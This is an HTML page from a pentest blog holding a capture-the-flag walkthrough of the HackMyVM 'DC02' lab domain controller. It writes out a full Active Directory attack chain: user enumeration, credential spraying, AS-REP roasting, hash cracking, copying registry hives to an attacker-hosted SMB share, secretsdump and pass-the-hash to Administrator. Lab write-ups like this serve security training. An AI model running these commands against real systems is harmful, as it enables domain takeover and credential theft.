@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DC02 Walkthrough - V01</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <link href="../assets/css/style.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark" style="background-color:#212529 !important;">
+        <div class="container">
+            <a class="navbar-brand" href="../index.html">
+                <i class="fas fa-skull me-2"></i>V01
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="../index.html">
+                            <i class="fas fa-home me-1"></i>Home
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../writeups.html">
+                            <i class="fas fa-file-alt me-1"></i>Writeups
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../projects.html">
+                            <i class="fas fa-code me-1"></i>Projects
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../tags.html">
+                            <i class="fas fa-tags me-1"></i>Tags
+                        </a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content with Sidebar -->
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Sidebar -->
+            <div class="col-md-3 col-lg-2 sidebar">
+                <div class="sidebar-content">
+                    <div class="profile-section text-center mb-4">
+                        <img src="https://avatars.githubusercontent.com/u/110058202?v=4" 
+                             alt="V01" class="profile-avatar mb-3">
+                        <h5 class="text-white mb-2">V01</h5>
+                        <p class="text-white-50 mb-3">Pentester, CTF player</p>
+                        <p class="text-white-50 mb-3">ACCH Team</p>
+                        <a href="https://github.com/EndlssNightmare" 
+                           target="_blank" class="btn btn-outline-light btn-sm">
+                            <i class="fab fa-github me-1"></i>GitHub
+                        </a>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Main Content -->
+            <div class="col-md-9 col-lg-10 main-content">
+                <main class="my-4">
+                    
+                    <nav aria-label="breadcrumb">
+                        <ol class="breadcrumb">
+                            <li class="breadcrumb-item"><a href="../index.html">Home</a></li>
+                            <li class="breadcrumb-item"><a href="../writeups.html">Writeups</a></li>
+                            <li class="breadcrumb-item active" aria-current="page">DC02 Walkthrough</li>
+                        </ol>
+                    </nav>
+
+                    <div class="card border-0 shadow-sm">
+                        <div class="card-body">
+                            <div class="d-flex align-items-start gap-4">
+                                <div class="flex-grow-1">
+                                    <h1 class="card-title mb-3">DC02 Walkthrough</h1>
+                                    
+                                    <div class="mb-3">
+                                        <small class="text-muted">
+                                            <i class="fas fa-calendar me-1"></i>Created: Aug 12, 2025
+                                            
+                                            <br><i class="fas fa-edit me-1"></i>Updated: Aug 12, 2025
+                                        </small>
+                                    </div>
+
+                                    <div class="tag-container mb-4">
+                                        <a href="../tags/tag-hmv.html" class="tag-badge me-1">hmv</a>
+<a href="../tags/tag-windows.html" class="tag-badge me-1">windows</a>
+<a href="../tags/tag-ad.html" class="tag-badge me-1">ad</a>
+<a href="../tags/tag-asreproast.html" class="tag-badge me-1">asreproast</a>
+<a href="../tags/tag-dcsync.html" class="tag-badge me-1">dcsync</a>
+<a href="../tags/tag-backup-operators.html" class="tag-badge me-1">backup-operators</a>
+<a href="../tags/tag-password-cracking.html" class="tag-badge me-1">password-cracking</a>
+<a href="../tags/tag-smb.html" class="tag-badge me-1">smb</a>
+<a href="../tags/tag-ldap.html" class="tag-badge me-1">ldap</a>
+                                    </div>
+                                    
+                                    
+                                    <div class="machine-info mb-3">
+                                        <h6 class="text-muted mb-2"><i class="fas fa-server me-1"></i>Machine Information:</h6>
+                                        <div class="d-flex flex-wrap">
+                                            <span class="badge bg-primary me-2"><i class="fas fa-star me-1"></i>Difficulty: Medium</span><span class="badge bg-info me-2"><i class="fas fa-desktop me-1"></i>OS: Windows</span><span class="badge bg-secondary me-2"><i class="fas fa-network-wired me-1"></i>IP: 192.168.0.18</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div class="d-none d-md-block"><img src="https://hackmyvm.eu/img/vm/dc02.png" alt="Machine Photo" class="img-fluid rounded" style="max-width: 300px; height: auto;"></div>
+                            </div>
+
+                            <div id="markdown-content" class="markdown-content" style="display: none;">
+# Overview
+
+This Windows Domain Controller (DC01) in the SOUPEDECODE.LOCAL domain was discovered via internal network scanning. Enumeration revealed multiple Active Directory services and valid SMB credentials (charlie:charlie). AS-REP roasting against zximena448 yielded the password internet, granting Backup Operators group privileges. Registry hives (SAM, SYSTEM, SECURITY) were extracted remotely and cracked to obtain administrator-level hashes. Pass-the-Hash via WinRM provided full domain compromise and access to the root flag.
+
+## Enumeration
+
+We can run the `fping` command to find the exact IP address of the machine.
+```bash
+fping -g 192.168.0.0/24 | grep "is alive"
+192.168.0.1 is alive
+192.168.0.8 is alive
+192.168.0.18 is alive
+192.168.0.7 is alive
+192.168.0.11 is alive
+```
+
+Running `Nmap` port scanner to enumerate the services running on the target machine. From the nmap scan we have an indication that the target is running a Windows Server with `Active Directory` services.
+```bash
+sudo nmap -vv -sS -Pn -n -p- -sV -sC --min-rate=10000 192.168.0.18 -oN nmap/log.nmap
+
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2025-03-07 22:09:06Z)
+135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 128
+464/tcp   open  kpasswd5?     syn-ack ttl 128
+593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 128
+3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 128
+5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing
+49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+49682/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
+49713/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+MAC Address: 08:00:27:81:BE:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:81:be:9a (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+| Names:
+|   DC01<00>             Flags: <unique><active>
+|   SOUPEDECODE<00>      Flags: <group><active>
+|   SOUPEDECODE<1c>      Flags: <group><active>
+|   DC01<20>             Flags: <unique><active>
+|   SOUPEDECODE<1b>      Flags: <unique><active>
+| Statistics:
+|   08:00:27:81:be:9a:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 48259/tcp): CLEAN (Timeout)
+|   Check 2 (port 7597/tcp): CLEAN (Timeout)
+|   Check 3 (port 45162/udp): CLEAN (Timeout)
+|   Check 4 (port 59782/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2025-03-07T22:09:54
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 3h59m56s
+```
+
+Adding the domains into `hosts` file.
+```bash
+echo "192.168.0.18 DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL" | sudo tee -a /etc/hosts
+```
+
+Running kerbrute to enumerate users.
+```bash
+./kerbrute_linux_amd64 userenum --dc 192.168.0.18 -d SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+```
+![kerbrute](../images/DC02_images/1.png)
+
+## Exploitation
+
+We can try an username–password pairs line by line using nxc. We will see that `charlie:charlie` is a valid pair.
+```bash
+nxc smb SOUPEDECODE.LOCAL -u users.txt -p users.txt --no-bruteforce --continue-on-success
+```
+![kerbrute](../images/DC02_images/2.png)
+
+With `charlie` credentials, we can access and enumerate the SMB shares.
+```bash
+nxc smb SOUPEDECODE.LOCAL -u charlie -p charlie -M spider_plus
+```
+![kerbrute](../images/DC02_images/3.png)
+
+Enumerating users from LDAP with nxc.
+```bash
+nxc ldap SOUPEDECODE.LOCAL -u charlie -p charlie --users
+```
+![kerbrute](../images/DC02_images/4.png)
+
+Saved the users result on a file. Now we can try to make an AS-REP roast attack using the impacket tool, that will allow us to extract the asrep hash of `zximena448`:  
+```bash
+impacket-GetNPUsers -dc-ip 192.168.0.18 -request -usersfile users.txt SOUPEDECODE.LOCAL/
+```
+![kerbrute](../images/DC02_images/5.png)
+
+Cracking the `zximena448` hash with hashcat.
+```bash
+hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
+```
+![kerbrute](../images/DC02_images/6.png)
+
+The `zximena448` user have READ and WRITE permissions on C$ share folder:
+```bash
+nxc smb SOUPEDECODE.LOCAL -u zximena448 -p i... --shares
+```
+![kerbrute](../images/DC02_images/7.png)
+
+Retrieving the user flag.
+```bash
+smbclient //192.168.0.18/C$ -U 'zximena448'
+```
+![kerbrute](../images/DC02_images/8.png)
+
+## Pos Exploitation
+
+### Privilege Escalation
+
+Dumping domain informations with `ldapdomaindump`.
+```bash
+sudo ldapdomaindump -u 'SOUPDECODE.LOCAL\zximena448' -p 'i...' 192.168.0.18
+```
+![kerbrute](../images/DC02_images/9.png)
+
+The user `zximena448` it's a member from `Backup Operator` group.
+
+With that information, we can make a copy from SAM, SYSTEM and SECURITY files. In that case, we can use the `impacket-reg` tool.
+* Creating a share folder to receive the files:
+```bash
+mkdir -p /tmp/share
+chmod 777 /tmp/share
+impacket-smbserver share /tmp/share -smb2support
+```
+![kerbrute](../images/DC02_images/10.png)
+
+* Running the `impacket-reg` command to copy the files:
+```bash
+impacket-reg SOUPDECODE.LOCAL/zximena448:i...@192.168.0.18 backup -o '\\192.168.0.8\share'
+```
+![kerbrute](../images/DC02_images/11.png)
+
+With those files, we can use `impacket-secretsdump` to extract the hashes.
+```bash
+impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c...:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+![kerbrute](../images/DC02_images/12.png)
+
+
+We also can use the `dc01` user account and make a pass the hash attack to dump all hashes from domain controler.
+```bash
+impacket-secretsdump SOUPEDECODE.LOCAL/'dc01$'@192.168.0.18 -hashes :84204...
+```
+![kerbrute](../images/DC02_images/13.png)
+
+We can authenticate as the Administrator making a pass the hash attack:
+```bash
+nxc winrm 192.168.0.18 -u Administrator -H 8982...
+```
+![kerbrute](../images/DC02_images/14.png)
+
+Authenticating as Administrator and retrieving the root flag.
+```bash
+evil-winrm -i 192.168.0.18 -u Administrator -H 8982...
+```
+![kerbrute](../images/DC02_images/15.png)
+
+
+                            </div>
+                        </div>
+                    </div>
+
+                </main>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-light py-3 mt-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <p class="mb-0">© 2025 V01</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <script src="../assets/js/script.js"></script>
+    <script src="../assets/js/search.js"></script>
+    <script>
+        // Initialize markdown processing
+        document.addEventListener('DOMContentLoaded', function() {
+            const markdownContainer = document.getElementById('markdown-content');
+            if (markdownContainer) {
+                // Configure marked.js options
+                marked.setOptions({
+                    breaks: true,
+                    gfm: true,
+                    highlight: function(code, lang) {
+                        if (lang && Prism.languages[lang]) {
+                            return Prism.highlight(code, Prism.languages[lang], lang);
+                        }
+                        return code;
+                    }
+                });
+                
+                // Convert markdown to HTML
+                const markdownText = markdownContainer.textContent;
+                markdownContainer.innerHTML = marked.parse(markdownText);
+                markdownContainer.style.display = 'block';
+                
+                // Re-highlight code blocks with Prism
+                Prism.highlightAll();
+            }
+        });
+    </script>
+</body>
+</html>
